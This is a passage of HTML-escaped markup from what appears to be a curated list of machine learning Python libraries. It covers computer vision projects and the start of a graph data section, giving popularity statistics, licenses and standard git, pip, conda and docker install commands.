https://github.com/facebookresearch/pytorchvideo&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pytorchvideo&#34;&gt;PyPi&lt;/a&gt; (📥 17K / month · 📦 5 · ⏱️ 20.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pytorchvideo&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/graphics&#34;&gt;tensorflow-graphics&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 2.6K) - TensorFlow Graphics: Differentiable Graphics Layers.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/graphics&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 36 · 🔀 340 · 📋 220 - 59% open · ⏱️ 04.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/graphics&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorflow-graphics&#34;&gt;PyPi&lt;/a&gt; (📥 3.4K / month · 📦 4 · ⏱️ 03.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorflow-graphics&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/airctic/icevision&#34;&gt;icevision&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 690) - An Agnostic Computer Vision Framework - Pluggable to any Training.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/airctic/icevision&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 39 · 🔀 98 · 📋 640 - 21% open · ⏱️ 29.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/airctic/icevision&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/icevision&#34;&gt;PyPi&lt;/a&gt; (📥 3.9K / month · 📦 5 · ⏱️ 10.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install icevision&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/CellProfiler/CellProfiler&#34;&gt;CellProfiler&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 670) - An open-source application for biological image analysis. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/CellProfiler/CellProfiler&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 130 · 🔀 310 · 📥 2.7K · 📦 8 · 📋 3.1K - 6% open · ⏱️ 15.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/CellProfiler/CellProfiler&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/cellprofiler&#34;&gt;PyPi&lt;/a&gt; (📥 800 / month · ⏱️ 04.09.2017):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install cellprofiler&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/lucidrains/deep-daze&#34;&gt;deep-daze&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 4.2K) - Simple command line tool for text to image generation using OpenAIs.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/lucidrains/deep-daze&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 14 · 🔀 310 · 📦 38 · 📋 160 - 55% open · ⏱️ 13.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/lucidrains/deep-daze&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/deep-daze&#34;&gt;PyPi&lt;/a&gt; (📥 2.1K / month · ⏱️ 13.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install deep-daze&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/idealo/image-super-resolution&#34;&gt;Image Super-Resolution&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 3.6K · 💤) - Super-scale your images and run experiments with.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/idealo/image-super-resolution&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 10 · 🔀 620 · 📦 83 · 📋 200 - 44% open · ⏱️ 02.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/idealo/image-super-resolution&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/ISR&#34;&gt;PyPi&lt;/a&gt; (📥 4.5K / month · 📦 5 · ⏱️ 08.01.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install ISR&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://hub.docker.com/r/idealo/image-super-resolution-gpu&#34;&gt;Docker Hub&lt;/a&gt; (📥 210 · ⏱️ 01.04.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; docker pull idealo/image-super-resolution-gpu&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/vissl&#34;&gt;vissl&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 2.6K) - VISSL is FAIRs library of extensible, modular and scalable components.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookresearch/vissl&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 32 · 🔀 270 · 📦 7 · 📋 140 - 33% open · ⏱️ 15.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebookresearch/vissl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/vissl&#34;&gt;PyPi&lt;/a&gt; (📥 760 / month · 📦 1 · ⏱️ 02.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install vissl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/ClassyVision&#34;&gt;Classy Vision&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 1.5K) - An end-to-end PyTorch framework for image and video.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookresearch/ClassyVision&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 75 · 🔀 260 · 📋 110 - 46% open · ⏱️ 21.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebookresearch/ClassyVision&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/classy_vision&#34;&gt;PyPi&lt;/a&gt; (📥 2.3K / month · 📦 2 · ⏱️ 09.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install classy_vision&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/classy_vision&#34;&gt;Conda&lt;/a&gt; (📥 13K · ⏱️ 22.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge classy_vision&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tryolabs/norfair&#34;&gt;Norfair&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 1.4K) - Lightweight Python library for adding real-time object tracking to any.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tryolabs/norfair&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 12 · 🔀 130 · 📥 100 · 📋 57 - 31% open · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tryolabs/norfair&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/norfair&#34;&gt;PyPi&lt;/a&gt; (📥 3.6K / month · 📦 1 · ⏱️ 19.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install norfair&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ProvenanceLabs/image-match&#34;&gt;image-match&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 2.7K · 💤) - Quickly search over billions of images. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/ProvenanceLabs/image-match&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 19 · 🔀 400 · 📋 110 - 57% open · ⏱️ 21.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/ProvenanceLabs/image-match&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/image_match&#34;&gt;PyPi&lt;/a&gt; (📥 560 / month · 📦 4 · ⏱️ 13.02.2017):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install image_match&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/pycls&#34;&gt;pycls&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 1.9K) - Codebase for Image Classification Research, written in PyTorch. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookresearch/pycls&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 16 · 🔀 220 · 📦 5 · 📋 81 - 30% open · ⏱️ 15.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebookresearch/pycls&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pycls&#34;&gt;PyPi&lt;/a&gt; (📥 510 / month · ⏱️ 05.09.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pycls&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/detr&#34;&gt;DE⫶TR&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 8.9K) - End-to-End Object Detection with Transformers. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookresearch/detr&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 25 · 🔀 1.6K · 📋 430 - 37% open · ⏱️ 07.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebookresearch/detr&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/SlowFast&#34;&gt;PySlowFast&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 4.8K) - PySlowFast: video understanding codebase from FAIR for.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookresearch/SlowFast&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 27 · 🔀 920 · 📦 7 · 📋 510 - 50% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebookresearch/SlowFast&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pyslowfast&#34;&gt;PyPi&lt;/a&gt; (📥 9 / month · ⏱️ 15.01.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pyslowfast&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/google-research/scenic&#34;&gt;scenic&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 980) - Scenic: A Jax Library for Computer Vision Research and Beyond. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://jax.readthedocs.io/en/latest/_static/favicon.png&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/google-research/scenic&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 36 · 🔀 110 · 📦 16 · 📋 62 - 54% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/google-research/scenic&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/jasmcaus/caer&#34;&gt;Caer&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 620 · 💤) - A lightweight Computer Vision library. Scale your models, not boilerplate. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/jasmcaus/caer&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 8 · 🔀 110 · 📥 19 · 📋 15 - 13% open · ⏱️ 13.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/jasmcaus/caer&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/caer&#34;&gt;PyPi&lt;/a&gt; (📥 3.3K / month · 📦 1 · ⏱️ 13.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install caer&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 12 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/glfw/glfw&#34;&gt;glfw&lt;/a&gt;&lt;/b&gt; (🥈36 · ⭐ 9.1K) - A multi-platform library for OpenGL, OpenGL ES, Vulkan, window and input. &lt;code&gt;&lt;a href=&#34;https://tldrlegal.com/search?q=Zlib&#34;&gt;❗️Zlib&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/aleju/imgaug&#34;&gt;imgaug&lt;/a&gt;&lt;/b&gt; (🥈35 · ⭐ 13K · 💀) - Image augmentation for machine learning experiments. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/pytorch3d&#34;&gt;PyTorch3D&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 6K) - PyTorch3D is FAIRs library of reusable components for deep.. &lt;code&gt;❗Unlicensed&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/uploadcare/pillow-simd&#34;&gt;Pillow-SIMD&lt;/a&gt;&lt;/b&gt; (🥉28 · ⭐ 1.8K) - The friendly PIL fork. &lt;code&gt;&lt;a href=&#34;https://tldrlegal.com/search?q=PIL&#34;&gt;❗️PIL&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/chainer/chainercv&#34;&gt;chainercv&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 1.5K · 💀) - ChainerCV: a Library for Deep Learning in Computer Vision. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/qubvel/segmentation_models&#34;&gt;segmentation_models&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 3.9K · 💀) - Segmentation models with pretrained backbones. Keras.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/idealo/imagededup&#34;&gt;Image Deduplicator&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 4K · 💀) - Finding duplicate images made easy!. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tryolabs/luminoth&#34;&gt;Luminoth&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 2.4K · 💀) - Deep Learning toolkit for Computer Vision. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/hhatto/nude.py&#34;&gt;nude.py&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 860 · 💀) - Nudity detection with Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Oulu-IMEDS/solt&#34;&gt;solt&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 260 · 💀) - Streaming over lightweight data transformations. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/qanastek/HugsVision&#34;&gt;HugsVision&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 160) - HugsVision is a easy to use huggingface wrapper for state-of-the-.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;huggingface&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/nicolas-chaulet/torch-points3d&#34;&gt;Torch Points 3D&lt;/a&gt;&lt;/b&gt; (🥉14 · ⭐ 61 · 🐣) - Pytorch framework for doing deep learning on point.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Graph Data&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries for graph processing, clustering, embedding, and machine learning tasks.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/networkx/networkx&#34;&gt;networkx&lt;/a&gt;&lt;/b&gt; (🥇44 · ⭐ 11K) - Network Analysis in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/networkx/networkx&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 590 · 🔀 2.6K · 📥 60 · 📦 110K · 📋 2.9K - 12% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/networkx/networkx&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/networkx&#34;&gt;PyPi&lt;/a&gt; (📥 22M / month · 📦 13K · ⏱️ 21.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install networkx&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/networkx&#34;&gt;Conda&lt;/a&gt; (📥 6.5M · ⏱️ 21.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge networkx&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pyg-team/pytorch_geometric&#34;&gt;PyTorch Geometric&lt;/a&gt;&lt;/b&gt; (🥇38 · ⭐ 15K) - Graph Neural Network Library for PyTorch. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pyg-team/pytorch_geometric&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 270 · 🔀 2.6K · 📋 2.6K - 37% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pyg-team/pytorch_geometric&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/torch-geometric&#34;&gt;PyPi&lt;/a&gt; (📥 88K / month · 📦 43 · ⏱️ 12.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install torch-geometric&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pytorch_geometric&#34;&gt;Conda&lt;/a&gt; (📥 6.5K · ⏱️ 16.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pytorch_geometric&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a 